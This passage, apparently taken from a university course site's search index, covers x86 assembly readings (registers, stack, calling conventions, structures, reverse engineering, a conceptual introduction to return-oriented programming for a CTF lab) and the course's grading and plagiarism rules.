    "relUrl": "/labs/lab-05/reading/registers.html#register-subsections"
  },"252": {
    "doc": "Reading: Registers",
    "title": "Static Memory Region Declarations",
    "content": "Static memory declarations (analogous to declaring global variables) in the x86 world are made through special assembly directives. These declarations are made in the data section (the .data region). Names can be attached to the declared memory portions through a label to easily reference them later in the program. Follow the example below: .DATA var `db` 64 ; Declares a byte containing the value 64. Labels ; the memory location as \"var\". var2 `db` ? ; Declares an uninitialized byte labeled \"var2\". `db` 10 ; Declares an unlabeled byte, initialized with 10. This ; byte will be placed at the address (var2 + 1). X `dw` ? ; Declares an uninitialized word (2 bytes), labeled \"X\". Y `dd` 3000 ; Declares a double word (4 bytes) labeled \"Y\", ; initialized with the value 3000. Z `dd` 1,2,3 ; Declares 3 double words (each 4 bytes) ; starting from address \"Z\" and initialized with 1, 2, and 3, respectively. ; For example, 3 will be placed at the address (Z + 8). NOTE: DB, DW, DD are directives used to specify the size of the portion: . | Directive | Role | Size | . | db | Define Byte | 1 bytes (8 bits) | . | dw | Define Word | 2 bytes (16 bits) | . | dd | Define Double Word | 4 bytes (32 bits) | . NOTE: There are multiple types of memory regions as can be seen in the image below: . The last declaration in the above example represents the declaration of an array. Unlike higher-level languages, where arrays can have multiple dimensions and their elements are accessed by indices, in assembly language, arrays are represented as a number of cells located in a contiguous area of memory. ",
    "url": "/labs/lab-05/reading/registers.html#static-memory-region-declarations",
    
    "relUrl": "/labs/lab-05/reading/registers.html#static-memory-region-declarations"
  },"253": {
    "doc": "Reading: Reverse Engineering",
    "title": "Reading: Reverse Engineering",
    "content": "Ghidra is a useful tool for investigating binaries and reverse engineering. ",
    "url": "/labs/lab-03/reading/reverse-engineering.html",
    
    "relUrl": "/labs/lab-03/reading/reverse-engineering.html"
  },"254": {
    "doc": "Reading: Reverse Engineering",
    "title": "Disassembly",
    "content": "The disassembly process is used to obtain a file containing assembly code from a binary file. This process is always possible because the machine code specific to the processor has a direct correspondence with the assembly code. For example, the operation add eax, 0x14, which adds 20 to the value in the eax register, is always represented using the binary code 83 c0 14. ",
    "url": "/labs/lab-03/reading/reverse-engineering.html#disassembly",
    
    "relUrl": "/labs/lab-03/reading/reverse-engineering.html#disassembly"
  },"255": {
    "doc": "Reading: Reverse Engineering",
    "title": "Decompiling",
    "content": "The Ghidra program can be used even for decompiling code. A decompiler can be used to obtain the source code in a (relatively) high-level language, which when compiled will produce an executable whose behavior will be the same as the original executable. In comparison, a disassembler performs an exact translation of an executable program into assembly language because there is a 1:1 relationship between machine code and assembly language. ",
    "url": "/labs/lab-03/reading/reverse-engineering.html#decompiling",
    
    "relUrl": "/labs/lab-03/reading/reverse-engineering.html#decompiling"
  },"256": {
    "doc": "Reading: CTF",
    "title": "Reading: CTF",
    "content": "In this laboratory, you will have to apply most of the concepts presented throughout this course under the format of Capture-The-Flag tasks. These tasks will test your understanding and mastery of specific static and dynamic analysis methods and tools, the compilation process, assembly language - syntax, registers, memory handling, functions, - as well as your ability to identify and exploit simple buffer overflow vulnerabilities. ",
    "url": "/labs/lab-12/reading/rop.html",
    
    "relUrl": "/labs/lab-12/reading/rop.html"
  },"257": {
    "doc": "Reading: CTF",
    "title": "Return Oriented Programming",
    "content": "For the bonus exercise, you will have to use Return Oriented Programming (ROP). This is a technique in which, if we have the ability to overwrite the return address, we execute gadgets. These gadgets are simply portions of the existing code that end with a ret instruction. Examples of gadgets include: . pop rdi ; mov rdx, rax ; mov r12, rax ; jmp 0xd178 pop rdi ; pop rbp ; ret pop rdi ; ret pop rsi ; pop rdi ; jmp 0xbd5f . Notice that each gadget must end in a control-flow instruction, such as a ret or a jmp. The reason is so that they can be chained together. We usually write payloads that contain the addresses of these snippets. Then we trigger the ROP attack by placing this payload to overwrite a code pointer with the first address in the payload (such as overwriting the return address with this address). Follow the example below to get a better picture: . The image above aims to execute pop rdx; pop rbx; ret. Let’s assume a function’s return address is overwritten with that of the gadget, gadget_addr. The following things are going to happen: . | The function’s ret will be executed and the rip will move to the first instruction of the gadget: pop rdx; the rsp will move towards the number 3 on the stack. | pop rdx is executed, so the number pointed by rsp is popped into rdx, which is 3; rsp increases and now points to 4. | Similarly, pop rbx will pop the number 4 into rbx; now rsp points to the new return address. | The gadget’s ret is executed, thus allowing us to execute new code: either a separate function, or a new gadget. | . To determine the address of a gadget in a binary, there is the tool ROPgadget. Alternatively, in pwndbg, you can use a command like rop --grep \"pop rsi\". ",
    "url": "/labs/lab-12/reading/rop.html#return-oriented-programming",
    
    "relUrl": "/labs/lab-12/reading/rop.html#return-oriented-programming"
  },"258": {
    "doc": "Rules and Grading",
    "title": "Rules and Grading",
    "content": " ",
    "url": "/rules-and-grading.html",
    
    "relUrl": "/rules-and-grading.html"
  },"259": {
    "doc": "Rules and Grading",
    "title": "Grading",
    "content": "To pass this course you need to obtain 5 points from a total of 10 points: You need a minimum of 2.5 points from the semester (midterm exam, assignments, laboratory sessions and lecture quizzes) in order to be able to take the final exam. | 5 points for the final exam | 2 points for the midterm exam | 2 points for the assignments | 0.5 points for the laboratory sessions | 0.5 points for the lecture quizzes | . ",
    "url": "/rules-and-grading.html#grading",
    
    "relUrl": "/rules-and-grading.html#grading"
  },"260": {
    "doc": "Rules and Grading",
    "title": "Final Exam",
    "content": "The final exam is worth 5 points. You can only participate in one exam in an exam session. The final exam is a practical exam. You will solve the exam using your own personal laptops. The final exam takes 120 minutes. The final exam is open-book. You can use the internet and any form of non-collabotarive resource. Any attempts to use a collaborative resource (WhatsApp, Google Docs, Teams, etc.) or tools like ChatGPT, Copilot (or other LLMs) is considered plagiarism. Phones are prohibited during the exam. You will need an ID (student card, national ID, etc.) in order to participate in the exam. ",
    "url": "/rules-and-grading.html#final-exam",
    
    "relUrl": "/rules-and-grading.html#final-exam"
  },"261": {
    "doc": "Rules and Grading",
    "title": "Midterm Exam",
    "content": "The midterm exam is worth 2 points. The midterm exam will take place on Saturday, May 10th. The midterm exam is a practical exam, identical with the final exam in term of rules. You will be assigned an interval in which you will participate in the exam. The midterm exam takes 60 minutes and will test knowledge acquired from the first eight labs (up to the Functions one). ",
    "url": "/rules-and-grading.html#midterm-exam",
    
    "relUrl": "/rules-and-grading.html#midterm-exam"
  },"262": {
    "doc": "Rules and Grading",
    "title": "Assignments",
    "content": "Assignments are worth 2 points of the final grade. There are 3 assignments, graded as follows: . | Assignment 1: 0.50p (24.03 - 06.04.2025) | Assignment 2: 0.75p (14.04 - 04.05.2025) | Assignment 3: 0.75p (05.05 - 25.05.2025) | . Each assignment has a single deadline. Once the deadline passes (soft deadline), the assignment can be submitted with a penalty of 2 points out of 10 per day for the next 5 days (hard deadline). Assignments will be subject to plagiarism detection and penalties. ",
    "url": "/rules-and-grading.html#assignments",
    
    "relUrl": "/rules-and-grading.html#assignments"
  },"263": {
    "doc": "Rules and Grading",
    "title": "Laboratory Sessions",
    "content": "Laboratory sessions take part in person in the lab rooms assigned according to the schedule. Student groups are divided in half (into two equally-sized subgroups or with a maximum difference of one student). The maximum number of students in a lab slot is 16. Starting from the third week, the attendance list for the laboratory becomes fixed. ",
    "url": "/rules-and-grading.html#laboratory-sessions",
    
    "relUrl": "/rules-and-grading.html#laboratory-sessions"
  },"264": {
    "doc": "Rules and Grading",
    "title": "Lecture Quizzes",
    "content": "There will be 4 lecture quizzes, worth a total of 0.5 points. These will be conducted online on the Moodle platform and will be available for one day (closing at 11:55 PM on the announced date). Each assessment will contain 5 questions, and the allocated time to complete it is 10 minutes. Each question will have an arbitrary number of answer choices, with only one correct answer. The schedule for the course assessments is described below: . | Course Assessment 1 will take place on March 18, 2025 and will cover chapters 1-3 (Programs and the Computing System, Program Investigation and Construction, Computer System Architecture). | Course Assessment 2 will take place on April 8, 2025 and will cover chapter 4-5 (Number Representation, x86 Hardware-Software Interface). | Course Assessment 3 will take place on April 29, 2025 and will cover chapters 6-7 (Stack, Functions). | Course Assessment 4 will take place on May 20, 2025 and will cover chapters 8-9 (Application Binary Interface, Buffer Overflow). | . ",
    "url": "/rules-and-grading.html#lecture-quizzes",
    
    "relUrl": "/rules-and-grading.html#lecture-quizzes"
  },"265": {
    "doc": "Rules and Grading",
    "title": "Rules",
    "content": " ",
    "url": "/rules-and-grading.html#rules",
    
    "relUrl": "/rules-and-grading.html#rules"
  },"266": {
    "doc": "Rules and Grading",
    "title": "Checking Assignments",
    "content": "Assignments will be automatically checked using public tests. There are no private tests. Assignments will be checked automatically using Moodle and GitLab. ",
    "url": "/rules-and-grading.html#checking-assignments",
    
    "relUrl": "/rules-and-grading.html#checking-assignments"
  },"267": {
    "doc": "Rules and Grading",
    "title": "Solving Assignments",
    "content": "Assignments are individual. Each assignment should be completed by a student without consulting the source code of their peers. If you encounter any problems in solving an assignment, please use the forum dedicated to that assignment. You can discuss among yourselves within the bounds of common sense; in other words, you don’t have to dictate the solution to someone, but you can provide a general idea. It is not allowed to request the solution to an assignment on sites like StackExchange or others. You can ask more general questions, but do not request the assignment solution. You can use code from labs and skeletons provided by us without any issues. You can use external resources (GitHub, open-source code, or others) as long as they do not represent obvious assignment solutions, publicly posted with or without intent. See the next paragraph for clarification. It is not allowed to publish assignment solutions (even after the course has ended). If you find public assignment solutions on GitHub or elsewhere, do not consult them, as this could lead to plagiarism and loss of points on assignments. We reiterate that if you need clarification, please use the forums provided for each assignment. It is not allowed to transfer files among yourselves. In general, we recommend not sharing screens with other classmates, either for inspiration or to help them with a solution. Avoid testing an assignment on a classmate’s system. There can be exceptions, such as assisting someone with troubleshooting, but please be mindful not to transition from “let’s figure out the problem” to “let me solve your assignment.” We recommend using the dedicated forum for each assignment to ask questions (or any other channel provided to you). ",
    "url": "/rules-and-grading.html#solving-assignments",
    
    "relUrl": "/rules-and-grading.html#solving-assignments"
  },"268": {
    "doc": "Rules and Grading",
    "title": "Plagiarism Penalties",
    "content": "Generally, we consider punitive measures to be the last resort. As long as an assignment is completed individually without problematic source code contributions from external sources, it is not considered a copied assignment. The concept of plagiarized assignments includes, but is not limited to, situations such as: . | Two assignments that bear sufficient resemblance to draw this conclusion. | Using source code from the internet that is clearly the solution to the assignment. | Utilizing portions of another classmate’s code. | Accessing another classmate’s code during the assignment. | Modifying an existing assignment. | Tracing another classmate’s code. | Direct assistance in completing the assignment (someone else wrote or dictated the code). | Someone else completes the assignment (willingly, for payment, or other benefits). | . In the event that two assignments are deemed plagiarized, both the source and destination will receive identical penalties, without discussions regarding who copied from whom and whose fault it is. Both the source and the destination will be given minus half of the assignment points (e.g., if the assignment is worth 1p, the plagiarised assignments will be given -0.5p). ",
    "url": "/rules-and-grading.html#plagiarism-penalties",
    
    "relUrl": "/rules-and-grading.html#plagiarism-penalties"
  },"269": {
    "doc": "Rules and Grading",
    "title": "Laboratory",
    "content": "Laboratory sessions take part in person in the lab rooms assigned according to the schedule. Student groups are divided in half (into two equally-sized subgroups or with a maximum difference of one student). The maximum number of students in a lab slot is 16. Starting from the third week, the attendance list for the laboratory becomes fixed. Transfers between subgroups are only allowed in objective situations. Reasons such as “I’m employed,” “I have classes for another course,” or “the schedule suits me better” are not considered. If you have an objective situation, you can request a transfer between subgroups by sending an email to Stefan Jumarea with the subject [PCLP2][Transfer Request] NAME Surname - Group, in which you describe the situation. You will be informed if the transfer is accepted. ",
    "url": "/rules-and-grading.html#laboratory",
    
    "relUrl": "/rules-and-grading.html#laboratory"
  },"270": {
    "doc": "Reading: C - Assembly Interaction: Stack",
    "title": "Reading: C - Assembly Interaction: Stack",
    "content": " ",
    "url": "/labs/lab-09/reading/stack-c-asm.html",
    
    "relUrl": "/labs/lab-09/reading/stack-c-asm.html"
  },"271": {
    "doc": "Reading: C - Assembly Interaction: Stack",
    "title": "Setting the Stack",
    "content": "When entering a procedure, it is necessary to set a stack frame to which to send parameters. Of course, if the procedure does not receive parameters, this step is not necessary. So to set the stack, the following code must be included: . push ebp mov ebp, esp . The EBP gives us the ability to use it as an index within the stack and should not be altered during the procedure. ",
    "url": "/labs/lab-09/reading/stack-c-asm.html#setting-the-stack",
    
    "relUrl": "/labs/lab-09/reading/stack-c-asm.html#setting-the-stack"
  },"272": {
    "doc": "Reading: C - Assembly Interaction: Stack",
    "title": "Passing Parameters from C to the Assembly Procedure",
    "content": "C programs send parameters to assembly procedures using the stack. Consider the following C program sequence: . #include &lt;stdio.h&gt; extern int sum(int a, int b); // declare the assembly procedure as external int main() { int a = 5, b = 7; int res = sum(a, b); // call the assembly procedure return 0; } . When C executes the call to sum(), it first pushes arguments on the stack in reverse order, then actually calls the procedure. Thus, upon entering the procedure body, the stack will be intact. Since the variables a and b are declared as int values, they will each use one word on the stack. This method of passing parameters is called value passing. The code of the Sum procedure might look like this: . section .text global sum ; declare the procedure label as global sum: push ebp mov ebp, esp mov eax, [ebp+8] ; retrieve the first argument mov ecx, [ebp+12] ; retrieve the second argument add eax, ecx ; calculate the sum pop ebp ret . It is interesting to note several things. First, the assembly code defaults the return value of the procedure to the eax register. Second, the ret command is sufficient to exit the procedure, due to the fact that the C compiler takes care of the rest of the stuff, such as removing parameters from the stack. ",
    "url": "/labs/lab-09/reading/stack-c-asm.html#passing-parameters-from-c-to-the-assembly-procedure",
    
    "relUrl": "/labs/lab-09/reading/stack-c-asm.html#passing-parameters-from-c-to-the-assembly-procedure"
  },"273": {
    "doc": "Reading: Introduction to the Stack",
    "title": "Reading: Introduction to the Stack",
    "content": "In this lab, we will learn about how the stack is represented in assembly language, its utility, and how to it could be useful to us. ",
    "url": "/labs/lab-07/reading/stack.html",
    
    "relUrl": "/labs/lab-07/reading/stack.html"
  },"274": {
    "doc": "Reading: Introduction to the Stack",
    "title": "Reminder: Stack Data Structure",
    "content": "NOTE: This is a quick reminder on how the abstract data structure works. If you feel like you already understand this, you can skip this part. In the world of algorithms and data structure, a “stack” is a data structure used to hold data, mirroring a real-life stack of objects (for example, a stack of books, or a stack of boxes). This data structure’s usefulness comes from optimizing the ease and speed at which elements can be added or removed from the top of the stack. It forces us to think about how our data is organized relative to the stack’s base and top. The usual operations with the stack are: . | push - add an element to the top of the stack | pop - get the element from the top of the stack and remove it | peek or top - get the element from the top of the stack without removing it | . The image below shows a stack data structure at different stages. The empty stack gains the element labeled “1” after the instruction “push 1” is applied to it. After the instruction “push 2”, the stack has two items, element 1 being below element 2. Finally, the “pop” instruction makes the stack lose element 2. As the above image suggests, the order in which items are inserted and removed from a stack is represented by the phrase “first in, last out”. ",
    "url": "/labs/lab-07/reading/stack.html#reminder-stack-data-structure",
    
    "relUrl": "/labs/lab-07/reading/stack.html#reminder-stack-data-structure"
  },"275": {
    "doc": "Reading: Introduction to the Stack",
    "title": "So, Why is it Useful?",
    "content": "In the previous chapters we learned how to work with the basics of assembly. A pretty big limitation we have imposed on ourselves by using such a low-level language is the small number of values we can work with at a time. For anything but small programs, having just the 6 registers (eax, ebx, ecx, edx, esi, edi) is usually not enough, and creating global variables for temporary values is not memory efficient and, at some point, we’ll struggle to even name them something reasonable! . You might have also felt the absence of functions. The stack will help us out as it provides a nice place to store: . | the arguments, | the values of registers before entering a function so they can be restored on exit, | and some metadata useful for when we want to exit out of a function. | . More on this in the next lab. As you might have guessed, the solution to this is to use a stack on which we can put arbitrary values onto. We don’t need implement it ourselves - it comes built-in 😄! Whenever a program stars, the kernel makes sure a zone of memory is allocated for the sole purpose of writing arbitrary data onto. Moreover, CPUs also have some specialized instructions that work directly with this memory in a way similar to how a normal stack works. Note: The size of the stack memory area is often set at compile-time. When going over the maximum allocated space, you can receive a Segmentation Fault, and the phenomenon is called a Stack Overflow. You will have probably received this error when you declare a local array with a very high capacity, or when calling a recursive function which never returns. ",
    "url": "/labs/lab-07/reading/stack.html#so-why-is-it-useful",
    
    "relUrl": "/labs/lab-07/reading/stack.html#so-why-is-it-useful"
  },"276": {
    "doc": "Reading: Introduction to the Stack",
    "title": "Stack Operations",
    "content": "The stack can be modified in two ways: . | By using special instructions designed for stack operations, the most common of which are push and pop: | . %include \"io.asm\" section .text global CMAIN CMAIN: mov eax, 7 mov ebx, 8 add eax, ebx push eax ; push the value of the eax register onto the stack mov eax, 10 ; we can now use the eax register, as its value is saved on the stack PRINTF32 `%d \\n\\x0`, eax ; 10 pop eax ; retrieve the value of the eax register from the stack PRINTF32 `%d \\n\\x0`, eax ; 15 . | By directly accessing the memory with the help of a special register in which the top of the stack is held - esp also known as the “stack pointer register”. | . %include \"io.asm\" section .text global CMAIN CMAIN: mov eax, 7 mov ebx, 8 add eax, ebx sub esp, 4 ; reserve 4 bytes on the stack mov [esp], eax ; move the contents of the eax register to the new address pointed to by esp mov eax, 10 PRINTF32 `%d \\n\\x0`, eax mov eax, [esp] ; retrieve the value from the stack add esp, 4 ; restore the value of the esp register PRINTF32 `%d \\n\\x0`, eax . IMPORTANT: Comment out the instructions sub esp, 4 and add esp, 4. What happens? Why? . NOTE: The stack is used to remember the return address when a function is called. Note that the stack grows from higher addresses to lower addresses. This is why memory allocation on the stack is done using the sub instruction, and deallocation is done using the add instruction. Some processors do not have support for stack operations: for example, MIPS processors do not have push and pop instructions and do not have a special register for the stack pointer. Thus, if we want to implement stack operations on a MIPS processor, we would do it exactly as in the example above, but we can choose any register to keep track of the stack pointer. Therefore, the push eax instruction on an x86 processor is equivalent to: . sub esp, 4 mov [esp], eax . And the pop eax is equivalent to: . mov eax, [esp] add esp, 4 . IMPORTANT: We need to be careful with the amount of data allocated on the stack because the size of the stack is limited. Overfilling the stack will lead to the well-known error of stack overflow (more in the security lab). NOTE: The default stack size on Linux for a 64-bit architecture is 8MiB. ",
    "url": "/labs/lab-07/reading/stack.html#stack-operations",
    
    "relUrl": "/labs/lab-07/reading/stack.html#stack-operations"
  },"277": {
    "doc": "Reading: Introduction to the Stack",
    "title": "Stack in the Context of a Process’s Address Space",
    "content": "A process’s address space, or more precisely, a process’s virtual address space, represents the virtual memory area usable by a process. Each process has its own address space. Even in situations where two processes share a memory region, the virtual space is distinct, but it maps to the same physical memory region. In the figure above, a typical process’s address space is presented. The four important zones in a process’s address space are the data zone, the code zone, the stack, and the heap. As can be observed from the figure, the stack and the heap are the zones that can grow. In fact, these two zones are dynamic and only make sense in the context of a process. On the other hand, the information in the data and code zones is described in the executable. ",
    "url": "/labs/lab-07/reading/stack.html#stack-in-the-context-of-a-processs-address-space",
    
    "relUrl": "/labs/lab-07/reading/stack.html#stack-in-the-context-of-a-processs-address-space"
  },"278": {
    "doc": "Reading: Introduction to the Stack",
    "title": "Tricks and Tips",
    "content": ". | The golden rule of stack usage is: the number of push-es should equal the number of pop-s in a function. Given that the stack is used for function calls, it is very important that when a function finishes its execution, the stack pointer should be updated so that it points to the same memory location (of the stack) as it did at the time of entering the function. | In situations where we perform N push-es and reach the end of the function without doing a pop for any of the values, we can restore the stack pointer using the add instruction. | . section .text global CMAIN CMAIN: mov eax, 5 mov ebx, 6 mov ecx, 7 push eax push ebx push ecx add esp, 12 ; equivalent to using 3 consecutive pop-s ret . | An alternative method is to save the current stack pointer value in a separate register, such as ebp, before performing any push operations. This allows us to easily restore the stack pointer value at the end of the function, without having to keep track of the number of push operations performed. | . section .text global CMAIN CMAIN: mov ebp, esp ; save current stack pointer value in ebp mov eax, 5 mov ebx, 6 mov ecx, 7 push eax push ebx push ecx mov esp, ebp ; restore stack pointer value ret . IMPORTANT: What is the primary use of the ebp register? . As we can observe, the ebp register defines the stack frame for each function. Similarly to how we can address local variables using the esp register, we can do the same with ebp. Additionally, we will see that function parameters are addressed using ebp. ",
    "url": "/labs/lab-07/reading/stack.html#tricks-and-tips",
    
    "relUrl": "/labs/lab-07/reading/stack.html#tricks-and-tips"
  },"279": {
    "doc": "Reading: Structured Data - Structures",
    "title": "Reading: Structured Data - Structures",
    "content": "We will introduce the concept of structures in assembly language and work with specialized operations on strings. ",
    "url": "/labs/lab-06/reading/structures.html",
    
    "relUrl": "/labs/lab-06/reading/structures.html"
  },"280": {
    "doc": "Reading: Structured Data - Structures",
    "title": "Structures",
    "content": "Structures are used to group data of different types that can be used together to create a composite type. Next, we will go through the steps necessary to use a structure: declaration, instantiation, and accessing the fields of a structure. Declaring a Structure . In NASM, a structure is declared using the construction struc &lt;structure name&gt;, followed by a list of fields and terminated with endstruc. Each field of the structure is defined by the following: a label (used to access members), the type specifier, and the number of elements. Example: . struc mystruct a: resw 1 ; a will refer to a single word-sized element b: resd 1 ; b will refer to a single double-word-sized element c: resb 1 ; c will refer to a single byte-sized element d: resd 1 ; d will refer to a single double-word-sized element e: resb 6 ; e will refer to 6 byte-sized elements endstruc . NOTE: Here pseudo-instructions from the NASM res family are used to define the data type and the number of elements for each of the structure fields. For more details about the res syntax, please follow this link: NASM Documentation . Each label defining a field represents the offset of the field within the structure. For example, b will have the value 2, because there are 2 bytes from the beginning of the structure to the b field (the first 2 bytes are occupied by the a word). WARNING: If you want to use the same field name in two different structures, you must prefix the label name with a dot (.) like this: . struc mystruct1 .a: resw 1 .b: resd 1 endstruc struc mystruct2 .a: resd 16 .b: resw 1 endstruc . Use the construction mystruct2.b to find the offset value of ‘b’ within the structure mystruct2. Instantiating a Structure . One way to have a structure in memory is to declare it statically in the .data section. The syntax uses NASM macros istruc and iend along with the at keyword. In the following example, static instantiation of the structure declared above is presented, where struct_var is the memory address where the data begins. struct_var: istruc mystruct at a, dw -1 at b, dd 0x12345678 at c, db ' ' at d, dd 23 at e, db 'Gary', 0 iend . If you define the structure fields using a dot (.), the instantiation of the structure is done as follows: . struct_var: istruc mystruct at mystruct.a, dw -1 at mystruct.b, dd 0x12345678 at mystruct.c, db ' ' at mystruct.d, dd 23 at mystruct.e, db 'Gary', 0 iend . WARNING: To avoid initializing members incorrectly, you must ensure that for each field, the data type in instantiation matches the type in declaration. Accessing Values from a Structure . To access and/or modify a specific member of the instantiated structure, we need to know its address. This address can be obtained by calculating the sum of the starting address of the structure and the offset within the structure of the desired member. The following code sequence demonstrates setting a value in the b field of the structure and subsequently displaying the value of this field. mov eax, 12345 mov dword [mystruct + b], eax ; the address of field b is the base address of the statically instantiated structure + the offset of the field (given by the label 'b') mov ebx, dword [mystruct + b] ; putting the value from field b into the ebx register for display PRINTF32 `%d\\n\\x0`, ebx . ",
    "url": "/labs/lab-06/reading/structures.html#structures",
    
    "relUrl": "/labs/lab-06/reading/structures.html#structures"
  },"281": {
    "doc": "Reading: x86 Family",
    "title": "Reading: x86 Family",
    "content": "Almost all major processors from Intel share a common ISA (Instruction Set Architecture). These processors are highly backward compatible, with most instructions unchanged over generations, but only added or extended. NOTE: An ISA defines the instructions supported by a processor, register size, addressing modes, data types, instruction format, interrupts, and memory organization. Processors in this family fall into the broad category of CISC (Complex Instruction Set Computers). The philosophy behind them is to have a large number of instructions, with variable length, capable of performing complex operations, over multiple clock cycles. ",
    "url": "/labs/lab-04/reading/x86-architecture-family.html",
    
    "relUrl": "/labs/lab-04/reading/x86-architecture-family.html"
  },"282": {
    "doc": "Reading: x86 Family",
    "title": "Registers",
    "content": "The basic working units for x86 processors are registers. These are a suite of locations within the processor through which it interacts with memory, I/O, etc. x86 processors have 8 such 32-bit registers. Although any of these can be used in operations, for historical reasons, each register has a specific role. | Name | Role | . | eax | accumulator; system calls, I/O, arithmetic | . | ebx | base register; used for memory-based addressing | . | ecx | counter in loop instructions | . | edx | data register, used for I/O, arithmetic, interrupt values; can extend eax to 64 bits | . | esi | source in string operations | . | edi | destination in string operations | . | ebp | base or frame pointer; points to the current stack frame | . | esp | stack pointer; points to the top of the stack | . In addition to these, there are some special registers that cannot be directly accessed by the programmer, such as eflags and eip (Instruction Pointer). eip is a register that holds the address of the current instruction to be executed. It cannot be directly modified, programmatically, but indirectly through jump, call, and ret instructions. The eflags register contains 32 bits used as status indicators or condition variables. We say that a flag is set if its value is 1. The ones commonly used by programmers are: . | Name | Expanded Name | Description | . | CF | Carry Flag | Set if the result exceeds the maximum (or minimum) unsigned integer value | . | PF | Parity Flag | Set if the low byte of the result contains an even number of 1 bits | . | AF | Auxiliary Carry Flag | Used in BCD arithmetic; set if bit 3 generates a carry or borrow | . | ZF | Zero Flag | Set if the result of the previous instruction is 0 | . | SF | Sign Flag | Has the same value as the sign bit of the result (1 negative, 0 positive) | . | OF | Overflow Flag | Set if the result exceeds the maximum (or minimum) signed integer value | . NOTE: If you follow the evolution of registers from 8086, you’ll see that initially they were named ax, bx, cx etc., and were 16 bits in size. From 80386, Intel extended these registers to 32 bits (i.e., “extended” ax → eax). ",
    "url": "/labs/lab-04/reading/x86-architecture-family.html#registers",
    
    "relUrl": "/labs/lab-04/reading/x86-architecture-family.html#registers"
  },"283": {
    "doc": "Reading: x86 Family",
    "title": "Instruction Classes",
    "content": "Although the current set of instructions for Intel processors has hundreds of instructions, we will only look at a small portion of them. More precisely, some of the 80386 instructions. All x86 processors instructions can fit into 3 categories : . | data movement instructions | arithmetical/logical instructions | program control instructions | . We will only display some of the more important instructions of each category since many of them are alike. Data Movement Instructions . These instructions are used to transfer data between registers, between memory and registers, and to initialize data: . | Name | Operands | Description | . | mov | dst, src | Moves the value from source to the destination(erasing what was in the destination before) | . | push | src | Moves the value from the source onto the “top” of the stack | . | pop | dst | Moves the value from the “top” of the stack into the destination | . | lea | dst, src | Loads the effective address of the source to the destination | . | xchg | dst, src | Swaps (Exchanges) the values between the source and the destination | . Arithmetic and Logic Instructions . These instructions perform arithmetic and logic operations: . | Name | Operands | Description | . | add | dst, src | Adds the source and the destination, storing the result in the destination | . | sub | dst, src | Subtracts the source from the destination, storing the result in the destination | . | and | dst, src | Calculates logical AND between the source and the destination, storing the result in the destination | . | or | dst, src | Calculates logical OR between the source and the destination, storing the result in the destination | . | xor | dst, src | Calculates logical XOR between the source and the destination, storing the result in the destination | . | test | dst, src | Calculates logical AND between the source and the destination without storing the result | . | shl | dst, &lt;const&gt; | Calculates the logical shifted value from the destination with a constant number of positions, storing the result in the destination | . Program Control Instructions . These instructions are used to control the flow of programs: . | Name | Operands | Description | . | jmp | &lt;address&gt; | Jumps unconditionally to the specified address(directly, by register, by labels) | . | cmp | dst, src | Compares the source with the destination(more details below) | . | jcond | &lt;address&gt; | Jumps conditionally to the specified address depending on the state of the flag(set/not set)/condition variable | . | call | &lt;address&gt; | Calls the subroutine located at the specified address | . NOTE: The ‘cmp dest, src’ instruction effectively calculates dest - src behind the scenes(as in subtracting the source from the destination). We are talking about an unsigned subtraction, without storing the result. Therefore, when talking about the code: . cmp eax, 0 jl negative . The jump to the negative label will be made only if the value in eax is less than 0. The eax - 0 subtraction is evaluated and if the result is negative(and so, eax is negative), the jump will be made. When have comparisons with 0, the same thing can be done more efficiently using the test instruction: . test eax, eax jl negative . More on this here. ",
    "url": "/labs/lab-04/reading/x86-architecture-family.html#instruction-classes",
    
    "relUrl": "/labs/lab-04/reading/x86-architecture-family.html#instruction-classes"
  }
}
